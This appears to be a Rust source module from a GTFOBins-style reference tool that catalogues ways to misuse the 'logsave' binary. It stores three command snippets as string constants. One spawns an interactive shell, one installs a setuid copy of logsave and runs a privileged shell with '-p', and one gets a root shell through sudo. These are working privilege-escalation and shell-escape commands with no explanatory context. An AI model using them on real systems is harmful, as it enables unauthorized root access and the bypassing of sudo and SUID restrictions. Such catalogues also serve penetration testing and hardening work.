pub static BIN_NAME: &'static str = "logsave";
pub static SH_CODE: &'static str = r#"
    
    logsave /dev/null /bin/sh -i
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which logsave) .

    ./logsave /dev/null /bin/sh -i -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo logsave /dev/null /bin/sh -i
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
